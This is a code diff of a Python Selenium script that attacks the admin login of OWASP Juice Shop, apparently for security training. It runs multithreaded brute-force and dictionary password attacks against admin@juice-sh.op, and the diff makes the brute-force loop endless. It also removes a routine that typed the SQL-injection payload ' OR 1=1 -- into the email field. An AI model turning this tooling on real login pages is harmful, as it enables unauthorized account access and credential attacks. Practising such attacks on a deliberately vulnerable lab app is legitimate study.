@@ -15,12 +15,12 @@ all_letters = string.ascii_letters.join(num_options)
 
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-method', required=True) # valid types: sql, brute, dict
-parser.add_argument('-target', nargs='?', const="admin@juice-sh.op", default="admin@juice-sh.op")
+parser.add_argument('-method', required=True) # valid types: brute, dict, hard
+parser.add_argument('-username', nargs='?', const="admin@juice-sh.op", default="admin@juice-sh.op")
 parser.add_argument('-threads', nargs='?', const=1, type=int, default=1)
 args = parser.parse_args()
 method = str(args.method)
-target = str(args.target)
+username = str(args.username)
 threads = int(args.threads)
 
 
@@ -54,16 +54,16 @@ def init_driver():
     return(driver)
 
 
-def start_tester(method, target):
+def start_tester(method, username):
     driver = init_driver()
-    if(method == "sql"):
-        logInAdminSql(driver)
-    elif(method == "brute"):
-        bruteForcePassword(driver, False, target)
-    elif(method == "hardbrute"):
-        bruteForcePassword(driver, True, target)
+    print(method)
+    print(username)
+    if(method == "brute"):
+        bruteForcePassword(driver, False, username)
+    elif(method == "hard"):
+        bruteForcePassword(driver, True, username)
     elif(method == "dict"):
-        databasePassword(driver, target)
+        databasePassword(driver, username)
     else:
         print("Usage: adminLogin.py -method=[sql, brute]")
     # Close the browser
@@ -75,9 +75,8 @@ def main():
     p = []
     if __name__ == '__main__':
         for n in range(threads):
-            p.append(Process(target=start_tester, args=(method, target)))
+            p.append(Process(target=start_tester, args=(method, username)))
             p[n].start()
-    #start_tester(method, target)
 
 def databasePassword(driver, target):
     try:
@@ -112,7 +111,7 @@ def databasePassword(driver, target):
             except Exception as e:
                 print(f"Could not enter text: {e}")
 
-def bruteForcePassword(driver, attempts, hardness, target):
+def bruteForcePassword(driver, hardness, username):
         # Attempt to log in
     print("Strap in, this could take quite a while")
     mercy = random.randint(250, 350)
@@ -133,9 +132,11 @@ def bruteForcePassword(driver, attempts, hardness, target):
     emailField = WebDriverWait(driver, 10).until(
         EC.presence_of_element_located((By.ID, "email"))
     )
-    emailField.send_keys(target)
+    emailField.send_keys(username)
     # Open file and test each password
-    for n in range(1, attempts):
+    n = 0
+    while(True):
+        n += 1
         if(hardness):
             password = randomhard()
         else:
@@ -163,34 +164,6 @@ def bruteForcePassword(driver, attempts, hardness, target):
         #except Exception as e:
         #    print(f"Could not find invalid text: {e}")
 
-
-def logInAdminSql(driver):
-    
-
-    # Attempt to log in
-    try:
-
-        acctBtn = WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.ID, "navbarAccount"))
-        )
-        acctBtn.click()
-
-        logInBtn = WebDriverWait(driver, 10).until(
-            EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
-        )
-        logInBtn.click()
-
-        emailField = WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.ID, "email"))
-        )
-        emailField.send_keys("\' OR 1=1 --")
-        passwordField = WebDriverWait(driver, 10).until(
-            EC.presence_of_element_located((By.ID, "password"))
-        )
-        passwordField.send_keys("password")
-        passwordField.send_keys(Keys.RETURN)
-    except Exception as e:
-        print(f"Could not enter text: {e}")
 
 if __name__ == "__main__":
     main()
